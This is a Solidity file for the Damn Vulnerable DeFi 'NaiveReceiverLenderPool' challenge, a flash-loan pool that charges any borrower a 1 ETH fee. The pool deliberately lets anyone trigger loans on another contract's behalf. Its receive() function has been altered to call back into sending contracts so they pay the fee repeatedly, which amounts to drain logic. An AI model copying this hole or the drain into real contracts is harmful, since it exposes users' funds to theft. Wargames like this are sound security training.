// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard {
    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount)
        external
        nonReentrant
    {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE),
            borrowAmount
        );

        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive() external payable {
        // Making sure sender is a contract so that the tx doesn't revert when we top-up the contract with 1k ether
        // only re-entering if the sender has sufficient funds, otherwise the tx will revert
        // this will re-enter in the 'receiveEther' function of the contract 9 times, receiver will send us
        // 1 eth each time
        if (msg.sender.isContract()) {
            if (address(msg.sender).balance > 0) {
                msg.sender.functionCallWithValue(
                    abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE),
                    0
                );
            }
        }
    }
}
